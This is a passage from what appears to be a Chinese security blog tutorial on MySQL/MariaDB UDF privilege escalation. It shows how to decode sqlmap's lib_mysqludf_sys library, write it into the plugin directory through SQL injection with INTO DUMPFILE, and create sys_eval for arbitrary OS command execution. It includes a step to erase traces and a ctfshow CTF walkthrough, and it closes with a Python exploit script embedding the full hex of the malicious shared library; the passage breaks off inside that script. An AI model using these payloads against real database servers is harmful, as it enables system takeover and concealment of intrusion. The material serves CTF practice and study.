<p>自动化注入工具Sqlmap已经集成了此功能。</p>
<p><strong>在 \sqlmap\data\udf\mysql\windows\64目录下存放着lib_mysqludf_sys.dll_</strong></p>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210802180556258.png" alt="image-20210802180556258"></p>
<blockquote>
<ul>
<li><strong>但是sqlmap中自带的shell以及一些二进制文件，为了防止误杀都经过异或编码，不能直接使用</strong></li>
</ul>
</blockquote>
<p><strong>可以利用sqlmap 自带的解码工具cloak.py，在sqlmap\extra\cloak中打开命令行，来对lib_mysqludf_sys.dll_进行解码在，然后在直接利用，输入下面的</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cloak.py -d -i C:\sqlmap\data\udf\mysql\windows\64\lib_mysqludf_sys.dll_</span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210802180926662.png" alt="image-20210802180926662"></p>
<p>接着就会在\sqlmap\data\udf\mysql\windows\64目录下生成一个dll的文件<strong>lib_mysqludf_sys.dll</strong>，这个我们就可以直接拿来利用</p>
<p>攻击者可以利用lib_mysqludf_sys提供的函数执行系统命令。</p>
<p>函数：</p>
<p><strong>sys_eval，执行任意命令，并将输出返回。</strong></p>
<p><strong>sys_exec，执行任意命令，并将退出码返回。</strong></p>
<p><strong>sys_get，获取一个环境变量。</strong></p>
<p><strong>sys_set，创建或修改一个环境变量。</strong></p>
<p>以我windows系统为例，mysql版本为<strong>MySQL5.7.26</strong></p>
<p><strong>注意：攻击过程中，首先需要将lib_mysqludf_sys ( 目标为windows时，lib_mysqludf_sys.dll；linux时，lib_mysqludf_sys.so）上传到数据库能访问的路径下。</strong></p>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210802181450673.png" alt="image-20210802181450673"></p>
<blockquote>
<ul>
<li><strong>直接将刚刚生成的64位windows的dll文件复制到<code>D:\phpstudy8\Extensions\MySQL5.7.26\lib\plugin</code>中，然后再mysql中执行以下语句</strong></li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">function</span> sys_eval <span class="keyword">returns</span> <span class="keyword">string</span> <span class="keyword">soname</span> <span class="string">'udf.dll'</span></span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210802181552843.png" alt="image-20210802181552843"></p>
<blockquote>
<ul>
<li><p>然后就可以任意命令执行了</p>
</li>
<li><p><strong>sys_eval，执行任意命令，并将输出返回。</strong></p>
<p><strong>sys_exec，执行任意命令，并将退出码返回。</strong></p>
<p><strong>sys_get，获取一个环境变量。</strong></p>
<p><strong>sys_set，创建或修改一个环境变量。</strong></p>
</li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select sys_eval(&#39;ipconfig&#39;)</span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210802181722479.png" alt="image-20210802181722479"></p>
<h3 id="六、实战情况之一，hex编-解传入mysql系统提权"><a href="#六、实战情况之一，hex编-解传入mysql系统提权" class="headerlink" title="六、实战情况之一，hex编/解传入mysql系统提权"></a><strong>六、实战情况之一，hex编/解传入mysql系统提权</strong></h3><blockquote>
<ul>
<li><strong>本地利用的情况，你得已经上传webshell的情况下才能成功。如果你在sql实战中遇到可以使用outfile等上传文件的情况下，如何利用来系统权限命令执行。下面我们先熟悉一下本地测试一下具体情况</strong></li>
</ul>
</blockquote>
<p><strong>为了将这个转换为十六进制，可以借助mysql中的hex函数，先将udf.dll移动到C盘中，这样路径也清晰一些，然后执行下面命令</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">hex</span>(<span class="keyword">load_file</span>(<span class="string">'C:/udf.dll'</span>)) <span class="keyword">into</span> <span class="keyword">dumpfile</span> <span class="string">'c:/udf.txt'</span></span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210802184049609.png" alt="image-20210802184049609"></p>
<p>成功生成了十六进制形式流</p>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210802184106028.png" alt="image-20210802184106028"></p>
<p><strong>接下来就是把本地的udf16进制形式通过我们已经获得的webshell传到目标主机上。</strong></p>
<p><strong>一、新建一个表，名为udftmp，用于存放本地传来的udf文件的内容。</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> udftmp (c <span class="built_in">BLOB</span>)</span><br></pre></td></tr></table></figure></div>

<p><strong>二、在udftmp中写入udf文件内容</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> udftmp <span class="keyword">values</span>(<span class="keyword">unhex</span>(<span class="string">'udf文件的16进制格式'</span>))</span><br></pre></td></tr></table></figure></div>

<p><strong>三、将udf文件内容传入新建的udf文件中，路径根据自己的@@plugin_dir修改 //对于mysql小于5.1的，导出目录为</strong>C:\Windows\或C:\Windows\System32\</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> c <span class="keyword">from</span> udftmp <span class="keyword">into</span> <span class="keyword">dumpfile</span> <span class="string">'D:/phpstudy8/Extensions/MySQL5.7.26/lib/plugin/udf.dll'</span></span><br></pre></td></tr></table></figure></div>

<p><strong>四、执行下面语句，就可以system权限下命令任意执行，这电脑就沦陷了，执行命令上面已经说过，就不复述了</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">function</span> sys_eval <span class="keyword">returns</span> <span class="keyword">string</span> <span class="keyword">soname</span> <span class="string">'udf.dll'</span></span><br></pre></td></tr></table></figure></div>

<p><strong>五、删除痕迹，做好事不留名</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> udftmp</span><br></pre></td></tr></table></figure></div>

<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> sys_eval(<span class="string">'ipconfig'</span>);</span><br><span class="line">返回网卡信息</span><br></pre></td></tr></table></figure></div>

<p>本地实践了之后，基础知识差不多了解我们做一个实战靶场</p>
<p><strong>题目代码</strong></p>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210802215056685.png" alt="image-20210802215056685"></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql = "<span class="keyword">select</span> <span class="keyword">id</span>,username,pass <span class="keyword">from</span> ctfshow_user <span class="keyword">where</span> <span class="keyword">id</span> = <span class="string">'".$id."'</span> <span class="keyword">limit</span> <span class="number">1</span>;";</span><br></pre></td></tr></table></figure></div>

<blockquote>
<ul>
<li>测试了一下，明显存在堆叠注入，刚好可以利用堆叠注入，来进行udf来进行命令执行，<strong>测试，过滤information、and、or等各种语句无法布尔盲注、时间盲注、报错注入等</strong></li>
</ul>
</blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210802215137822.png" alt="image-20210802215137822"> </p>
<p><strong>好了，废话不多说直接看一下@@plugin_dir的路径来命令执行</strong></p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210802215552429.png" alt="image-20210802215552429"></p>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">目录&#x2F;usr&#x2F;lib&#x2F;mariadb&#x2F;plugin&#x2F;</span><br></pre></td></tr></table></figure></div>

<p>对方是linux,当然写 一个脚本跑会快一些，我先手工实操一遍，之后就用脚本梭哈，首先根据我之前的方法生成64位linux的udf.so的十六进制形式</p>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210803101639156.png" alt="image-20210803101639156"></p>
<p>由于这是get传参，是有长度限制的，16081的超过限制，会直接被ban了，所以我分按6000长度分为了三个文本文件里面装了udf十六进制三个部分</p>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210803101807533.png" alt="image-20210803101807533"></p>
<p>接着我们将a、b、c三个中里面的十六进制导入到被攻击的机器中</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="string">'a部分十六进制'</span> <span class="keyword">into</span> <span class="keyword">dumpfile</span> <span class="string">'/usr/lib/mariadb/plugin/a.txt'</span></span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210803102052966.png" alt="image-20210803102052966"></p>
<p><strong>为了确认我们是否已经导入load_file来判断</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">load_file</span>(<span class="string">'/usr/lib/mariadb/plugin/a.txt'</span>)</span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210803102140360.png" alt="image-20210803102140360"></p>
<p><strong>明显导入成功，照葫芦画瓢，将剩下的b和c导入进去</strong></p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210803102422360.png" alt="image-20210803102422360"></p>
</blockquote>
<p>当明显确定已经都导入成功了a、b、c三部分udf十六进制内容，接着来就是导入so到这个目录就可以命令执行</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select unhex(concat(load_file(&#39;&#x2F;usr&#x2F;lib&#x2F;mariadb&#x2F;plugin&#x2F;a.txt&#39;),load_file(&#39;&#x2F;usr&#x2F;lib&#x2F;mariadb&#x2F;plugin&#x2F;b.txt&#39;),load_file(&#39;&#x2F;usr&#x2F;lib&#x2F;mariadb&#x2F;plugin&#x2F;c.txt&#39;),load_file(&#39;&#x2F;usr&#x2F;lib&#x2F;mariadb&#x2F;plugin&#x2F;d.txt&#39;))) into dumpfile &#39;&#x2F;usr&#x2F;lib&#x2F;mariadb&#x2F;plugin&#x2F;udf.so&#39;</span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210803102536467.png" alt="image-20210803102536467"></p>
<p><strong>最后我们创建sys_eval这个函数来进行命令执行</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create function sys_eval returns string soname &#39;udf.so&#39;</span><br></pre></td></tr></table></figure></div>

<p><strong>明显获得了命令执行的权限</strong></p>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210803102656908.png" alt="image-20210803102656908"></p>
<p><strong>我们可以看看ip配置</strong></p>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210803102747630.png" alt="image-20210803102747630"></p>
<p><strong>接着就拿这题的flag</strong></p>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210803103022002.png" alt="image-20210803103022002"></p>
<p><strong>但是这样就有点慢了，我写个脚本。很快的，大家可以参考一下</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">"http://419e5714-21cb-4a29-82d4-cecf0bb82bf7.challenge.ctf.show:8080/api/"</span></span><br><span class="line">payload = <span class="string">"?id=1';select '&#123;&#125;' into dumpfile '/usr/lib/mariadb/plugin/&#123;&#125;.txt'--+"</span></span><br><span class="line">acquire = <span class="string">"?id=1';select load_file('/usr/lib/mariadb/plugin/&#123;&#125;.txt')--+"</span></span><br><span class="line">text = [<span class="string">'a'</span>,<span class="string">'b'</span>,<span class="string">'c'</span>,<span class="string">'d'</span>]</span><br><span class="line"></span><br><span class="line">udf=<span class="string">"7F454C4602010100000000000000000003003E0001000000D00C0000000000004000000000000000E8180000000000000000000040003800050040001A00190001000000050000000000000000000000000000000000000000000000000000001415000000000000141500000000000000002000000000000100000006000000181500000000000018152000000000001815200000000000700200000000000080020000000000000000200000000000020000000600000040150000000000004015200000000000401520000000000090010000000000009001000000000000080000000000000050E57464040000006412000000000000641200000000000064120000000000009C000000000000009C00000000000000040000000000000051E5746406000000000000000000000000000000000000000000000000000000000000000000000000000000000000000800000000000000250000002B0000001500000005000000280000001E000000000000000000000006000000000000000C00000000000000070000002A00000009000000210000000000000000000000270000000B0000002200000018000000240000000E00000000000000040000001D0000001600000000000000130000000000000000000000120000002300000010000000250000001A0000000F000000000000000000000000000000000000001B00000000000000030000000000000000000000000000000000000000000000000000002900000014000000000000001900000020000000000000000A00000011000000000000000000000000000000000000000D0000002600000017000000000000000800000000000000000000000000000000000000000000001F0000001C0000000000000000000000000000000000000000000000020000000000000011000000140000000200000007000000800803499119C4C93DA4400398046883140000001600000017000000190000001B0000001D0000002000000022000000000000002300000000000000240000002500000027000000290000002A00000000000000CE2CC0BA673C7690EBD3EF0E78722788B98DF10ED871581CC1E2F7DEA868BE12BBE3927C7E8B92CD1E7066A9C3F9BFBA745BB073371974EC4345D5ECC5A62C1CC3138AFF36AC68AE3B9FD4A0AC73D1C525681B320B5911FEAB5FBE120000000000000000000000000000000000000000000000000000000003000900A00B0000000000000000000000000000010000002000000000000000000000000000000000000000250000002000000000000000000000000000000000000000E0000000120000000000000000000000DE01000000000000790100001200000000000000000000007700000000000000BA0000001200000000000000000000003504000000000000F5000000120000000000000000000000C2010000000000009E010000120000000000000000000000D900000000000000FB000000120000000000000000000000050000000000000016000000220000000000000000000000FE00000000000000CF000000120000000000000000000000AD00000000000000880100001200000000000000000000008000000000000000AB010000120000000000000000000000250100000000000010010000120000000000000000000000DC00000000000000C7000000120000000000000000000000C200000000000000B5000000120000000000000000000000CC02000000000000ED000000120000000000000000000000E802000000000000E70000001200000000000000000000009B00000000000000C200000012000000000000000000000028000000000000008001000012000B007A100000000000006E000000000000007500000012000B00A70D00000000000001000000000000001000000012000C00781100000000000000000000000000003F01000012000B001A100000000000002D000000000000001F01000012000900A00B0000000000000000000000000000C30100001000F1FF881720000000000000000000000000009600000012000B00AB0D00000000000001000000000000007001000012000B0066100000000000001400000000000000CF0100001000F1FF981720000000000000000000000000005600000012000B00A50D00000000000001000000000000000201000012000B002E0F0000000000002900000000000000A301000012000B00F71000000000000041000000000000003900000012000B00A40D00000000000001000000000000003201000012000B00EA0F0000000000003000000000000000BC0100001000F1FF881720000000000000000000000000006500000012000B00A60D00000000000001000000000000002501000012000B00800F0000000000006A000000000000008500000012000B00A80D00000000000003000000000000001701000012000B00570F00000000000029000000000000005501000012000B0047100000000000001F00000000000000A900000012000B00AC0D0000000000009A000000000000008F01000012000B00E8100000000000000F00000000000000D700000012000B00460E000000000000E800000000000000005F5F676D6F6E5F73746172745F5F005F66696E69005F5F6378615F66696E616C697A65005F4A765F5265676973746572436C6173736573006C69625F6D7973716C7564665F7379735F696E666F5F6465696E6974007379735F6765745F6465696E6974007379735F657865635F6465696E6974007379735F6576616C5F6465696E6974007379735F62696E6576616C5F696E6974007379735F62696E6576616C5F6465696E6974007379735F62696E6576616C00666F726B00737973636F6E66006D6D6170007374726E6370790077616974706964007379735F6576616C006D616C6C6F6300706F70656E007265616C6C6F630066676574730070636C6F7365007379735F6576616C5F696E697400737472637079007379735F657865635F696E6974007379735F7365745F696E6974007379735F6765745F696E6974006C69625F6D7973716C7564665F7379735F696E666F006C69625F6D7973716C7564665F7379735F696E666F5F696E6974007379735F657865630073797374656D007379735F73657400736574656E76007379735F7365745F6465696E69740066726565007379735F67657400676574656E76006C6962632E736F2E36005F6564617461005F5F6273735F7374617274005F656E6400474C4942435F322E322E35000000000000000000020002000200020002000200020002000200020002000200020002000200020001000100010001000100010001000100010001000100010001000100010001000100010001000100010001000100000001000100B20100001000000000000000751A690900000200D401000000000000801720000000000008000000000000008017200000000000D01620000000000006000000020000000000000000000000D81620000000000006000000030000000000000000000000E016200000000000060000000A00000000000000000000000017200000000000070000000400000000000000000000000817200000000000070000000500000000000000000000001017200000000000070000000600000000000000000000001817200000000000070000000700000000000000000000002017200000000000070000000800000000000000000000002817200000000000070000000900000000000000000000003017200000000000070000000A00000000000000000000003817200000000000070000000B00000000000000000000004017200000000000070000000C00000000000000000000004817200000000000070000000D00000000000000000000005017200000000000070000000E00000000000000000000005817200000000000070000000F00000000000000000000006017200000000000070000001000000000000000000000006817200000000000070000001100000000000000000000007017200000000000070000001200000000000000000000007817200000000000070000001300000000000000000000004883EC08E827010000E8C2010000E88D0500004883C408C3FF35320B2000FF25340B20000F1F4000FF25320B20006800000000E9E0FFFFFFFF252A0B20006801000000E9D0FFFFFFFF25220B20006802000000E9C0FFFFFFFF251A0B20006803000000E9B0FFFFFFFF25120B20006804000000E9A0FFFFFFFF250A0B20006805000000E990FFFFFFFF25020B20006806000000E980FFFFFFFF25FA0A20006807000000E970FFFFFFFF25F20A20006808000000E960FFFFFFFF25EA0A20006809000000E950FFFFFFFF25E20A2000680A000000E940FFFFFFFF25DA0A2000680B000000E930FFFFFFFF25D20A2000680C000000E920FFFFFFFF25CA0A2000680D000000E910FFFFFFFF25C20A2000680E000000E900FFFFFFFF25BA0A2000680F000000E9F0FEFFFF00000000000000004883EC08488B05F50920004885C07402FFD04883C408C390909090909090909055803D900A2000004889E5415453756248833DD809200000740C488B3D6F0A2000E812FFFFFF488D05130820004C8D2504082000488B15650A20004C29E048C1F803488D58FF4839DA73200F1F440000488D4201488905450A200041FF14C4488B153A0A20004839DA72E5C605260A2000015B415CC9C3660F1F8400000000005548833DBF072000004889E57422488B05530920004885C07416488D3DA70720004989C3C941FFE30F1F840000000000C9C39090C3C3C3C331C0C3C341544883C9FF4989F455534883EC10488B4610488B3831C0F2AE48F7D1488D69FFE8B6FEFFFF83F80089C77C61754FBF1E000000E803FEFFFF488D70FF4531C94531C031FFB921000000BA07000000488D042E48F7D64821C6E8AEFEFFFF4883F8FF4889C37427498B4424104889EA4889DF488B30E852FEFFFFFFD3EB0CBA0100000031F6E802FEFFFF31C0EB05B8010000005A595B5D415CC34157BF00040000415641554531ED415455534889F34883EC1848894C24104C89442408E85AFDFFFFBF010000004989C6E84DFDFFFFC600004889C5488B4310488D356A030000488B38E814FEFFFF4989C7EB374C89F731C04883C9FFF2AE4889EF48F7D1488D59FF4D8D641D004C89E6E8DDFDFFFF4A8D3C284889DA4C89F64D89E54889C5E8A8FDFFFF4C89FABE080000004C89F7E818FDFFFF4885C075B44C89FFE82BFDFFFF807D0000750A488B442408C60001EB1F42C6442DFF0031C04883C9FF4889EFF2AE488B44241048F7D148FFC94889084883C4184889E85B5D415C415D415E415FC34883EC08833E014889D7750B488B460831D2833800740E488D353A020000E817FDFFFFB20188D05EC34883EC08833E014889D7750B488B460831D2833800740E488D3511020000E8EEFCFFFFB20188D05FC3554889FD534889D34883EC08833E027409488D3519020000EB3F488B46088338007409488D3526020000EB2DC7400400000000488B4618488B384883C70248037808E801FCFFFF31D24885C0488945107511488D351F0200004889DFE887FCFFFFB20141585B88D05DC34883EC08833E014889F94889D77510488B46088338007507C6010131C0EB0E488D3576010000E853FCFFFFB0014159C34154488D35EF0100004989CC4889D7534889D34883EC08E832FCFFFF49C704241E0000004889D8415A5B415CC34883EC0831C0833E004889D7740E488D35D5010000E807FCFFFFB001415BC34883EC08488B4610488B38E862FBFFFF5A4898C34883EC28488B46184C8B4F104989F2488B08488B46104C89CF488B004D8D4409014889C6F3A44C89C7498B4218488B0041C6040100498B4210498B5218488B4008488B4A08BA010000004889C6F3A44C89C64C89CF498B4218488B400841C6040000E867FBFFFF4883C4284898C3488B7F104885FF7405E912FBFFFFC3554889CD534C89C34883EC08488B4610488B38E849FBFFFF4885C04889C27505C60301EB1531C04883C9FF4889D7F2AE48F7D148FFC948894D00595B4889D05DC39090909090909090554889E5534883EC08488B05C80320004883F8FF7419488D1DBB0320000F1F004883EB08FFD0488B034883F8FF75F14883C4085BC9C390904883EC08E86FFBFFFF4883C408C345787065637465642065786163746C79206F6E6520737472696E67207479706520706172616D657465720045787065637465642065786163746C792074776F20617267756D656E747300457870656374656420737472696E67207479706520666F72206E616D6520706172616D6574657200436F756C64206E6F7420616C6C6F63617465206D656D6F7279006C69625F6D7973716C7564665F7379732076657273696F6E20302E302E34004E6F20617267756D656E747320616C6C6F77656420287564663A206C69625F6D7973716C7564665F7379735F696E666F290000011B033B980000001200000040FBFFFFB400000041FBFFFFCC00000042FBFFFFE400000043FBFFFFFC00000044FBFFFF1401000047FBFFFF2C01000048FBFFFF44010000E2FBFFFF6C010000CAFCFFFFA4010000F3FCFFFFBC0100001CFDFFFFD401000086FDFFFFF4010000B6FDFFFF0C020000E3FDFFFF2C02000002FEFFFF4402000016FEFFFF5C02000084FEFFFF7402000093FEFFFF8C0200001400000000000000017A5200017810011B0C070890010000140000001C00000084FAFFFF01000000000000000000000014000000340000006DFAFFFF010000000000000000000000140000004C00000056FAFFFF01000000000000000000000014000000640000003FFAFFFF010000000000000000000000140000007C00000028FAFFFF030000000000000000000000140000009400000013FAFFFF01000000000000000000000024000000AC000000FCF9FFFF9A00000000420E108C02480E18410E20440E3083048603000000000034000000D40000006EFAFFFFE800000000420E10470E18420E208D048E038F02450E28410E30410E38830786068C05470E50000000000000140000000C0100001EFBFFFF2900000000440E100000000014000000240100002FFBFFFF2900000000440E10000000001C0000003C01000040FBFFFF6A00000000410E108602440E188303470E200000140000005C0100008AFBFFFF3000000000440E10000000001C00000074010000A2FBFFFF2D00000000420E108C024E0E188303470E2000001400000094010000AFFBFFFF1F00000000440E100000000014000000AC010000B6FBFFFF1400000000440E100000000014000000C4010000B2FBFFFF6E00000000440E300000000014000000DC01000008FCFFFF0F00000000000000000000001C000000F4010000FFFBFFFF4100000000410E108602440E188303470E2000000000000000000000FFFFFFFFFFFFFFFF0000000000000000FFFFFFFFFFFFFFFF000000000000000000000000000000000100000000000000B2010000000000000C00000000000000A00B0000000000000D00000000000000781100000000000004000000000000005801000000000000F5FEFF6F00000000A00200000000000005000000000000006807000000000000060000000000000060030000000000000A00000000000000E0010000000000000B0000000000000018000000000000000300000000000000E81620000000000002000000000000008001000000000000140000000000000007000000000000001700000000000000200A0000000000000700000000000000C0090000000000000800000000000000600000000000000009000000000000001800000000000000FEFFFF6F00000000A009000000000000FFFFFF6F000000000100000000000000F0FFFF6F000000004809000000000000F9FFFF6F0000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000401520000000000000000000000000000000000000000000CE0B000000000000DE0B000000000000EE0B000000000000FE0B0000000000000E0C0000000000001E0C0000000000002E0C0000000000003E0C0000000000004E0C0000000000005E0C0000000000006E0C0000000000007E0C0000000000008E0C0000000000009E0C000000000000AE0C000000000000BE0C0000000000008017200000000000004743433A202844656269616E20342E332E322D312E312920342E332E3200004743433A202844656269616E20342E332E322D312E312920342E332E3200004743433A202844656269616E20342E332E322D312E312920342E332E3200004743433A202844656269616E20342E332E322D312E312920342E332E3200004743433A202844656269616E20342E332E322D312E312920342E332E3200002E7368737472746162002E676E752E68617368002E64796E73796D002E64796E737472002E676E752E76657273696F6E002E676E752E76657273696F6E5F72002E72656C612E64796E002E72656C612E706C74002E696E6974002E74657874002E66696E69002E726F64617461002E65685F6672616D655F686472002E65685F6672616D65002E63746F7273002E64746F7273002E6A6372002E64796E616D6963002E676F74002E676F742E706C74002E64617461002E627373002E636F6D6D656E7400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000F0000000500000002000000000000005801000000000000580100000000000048010000000000000300000000000000080000000000000004000000000000000B000000F6FFFF6F0200000000000000A002000000000000A002000000000000C000000000000000030000000000000008000000000000000000000000000000150000000B00000002000000000000006003000000000000600300000000000008040000000000000400000002000000080000000000000018000000000000001D00000003000000020000000000000068070000000000006807000000000000E00100000000000000000000000000000100000000000000000000000000000025000000FFFFFF6F020000000000000048090000000000004809000000000000560000000000000003000000000000000200000000000000020000000000000032000000FEFFFF6F0200000000000000A009000000000000A009000000000000200000000000000004000000010000000800000000000000000000000000000041000000040000000200000000000000C009000000000000C00900000000000060000000000000000300000000000000080000000000000018000000000000004B000000040000000200000000000000200A000000000000200A0000000000008001000000000000030000000A0000000800000000000000180000000000000055000000010000000600000000000000A00B000000000000A00B000000000000180000000000000000000000000000000400000000000000000000000000000050000000010000000600000000000000B80B000000000000B80B00000000000010010000000000000000000000000000040000000000000010000000000000005B000000010000000600000000000000D00C000000000000D00C000000000000A80400000000000000000000000000001000000000000000000000000000000061000000010000000600000000000000781100000000000078110000000000000E000000000000000000000000000000040000000000000000000000000000006700000001000000320000000000000086110000000000008611000000000000DD000000000000000000000000000000010000000000000001000000000000006F000000010000000200000000000000641200000000000064120000000000009C000000000000000000000000000000040000000000000000000000000000007D000000010000000200000000000000001300000000000000130000000000001402000000000000000000000000000008000000000000000000000000000000870000000100000003000000000000001815200000000000181500000000000010000000000000000000000000000000080000000000000000000000000000008E000000010000000300000000000000281520000000000028150000000000001000000000000000000000000000000008000000000000000000000000000000950000000100000003000000000000003815200000000000381500000000000008000000000000000000000000000000080000000000000000000000000000009A000000060000000300000000000000401520000000000040150000000000009001000000000000040000000000000008000000000000001000000000000000A3000000010000000300000000000000D016200000000000D0160000000000001800000000000000000000000000000008000000000000000800000000000000A8000000010000000300000000000000E816200000000000E8160000000000009800000000000000000000000000000008000000000000000800000000000000B1000000010000000300000000000000801720000000000080170000000000000800000000000000000000000000000008000000000000000000000000000000B7000000080000000300000000000000881720000000000088170000000000001000000000000000000000000000000008000000000000000000000000000000BC000000010000000000000000000000000000000000000088170000000000009B000000000000000000000000000000010000000000000000000000000000000100000003000000000000000000000000000000000000002318000000000000C500000000000000000000000000000001000000000000000000000000000000"</span></span><br><span class="line">udf_text=[]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">20000</span>,<span 